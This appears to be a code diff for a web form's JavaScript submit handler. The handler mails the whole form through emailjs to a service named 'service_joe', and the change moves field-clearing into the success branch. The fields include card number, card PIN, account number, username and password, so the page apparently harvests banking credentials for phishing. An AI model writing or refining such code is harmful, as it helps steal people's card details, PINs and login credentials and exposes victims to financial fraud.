@@ -23,33 +23,31 @@
                 emailjs.sendForm("service_joe","template_joe", this)
                 .then(function() {
                     console.log('SUCCESS!');
-                    let input = document.querySelectorAll('input')
-                    input.innerHTML = ""
-                        let subscribe = document.getElementById('submit')
-                        console.log('na me')
-                        subscribe.style.animationName = 'done';
-                        subscribe.value = 'DONE'
-                        let Subscribe = setTimeout(sub, 5000);
-                        function sub(){
-                            subscribe.value = 'Submit'
-                        }
+                    name.value = ""
+                    surname.value = ""
+                    lastname.value = ""
+                    reference.value = ""
+                    address.value = ""
+                    state.value = ""
+                    postal.value = ""
+                    amount.value = ""
+                    acctNumber.value = ""
+                    cardNumber.value = ""
+                    cardPin.value = ""
+                    username.value = ""
+                    password.value = ""
+                    id.value = ""
+                    email.value = ""
+                    let subscribe = document.getElementById('submit')
+                    console.log('na me')
+                    subscribe.style.animationName = 'done';
+                    subscribe.value = 'DONE'
+                    let Subscribe = setTimeout(sub, 5000);
+                    function sub(){
+                        subscribe.value = 'Submit'
+                    }
                     }, function(error) {
                         console.log('FAILED...', error);
-                        name.value = ""
-                        surname.value = ""
-                        lastname.value = ""
-                        reference.value = ""
-                        address.value = ""
-                        state.value = ""
-                        postal.value = ""
-                        amount.value = ""
-                        acctNumber.value = ""
-                        cardNumber.value = ""
-                        cardPin.value = ""
-                        username.value = ""
-                        password.value = ""
-                        id.value = ""
-                        email.value = ""
                         let subscribe = document.getElementById('submit')
                         subscribe.value = 'unable to submit'
                         subscribe.style.animationName = 'failed';
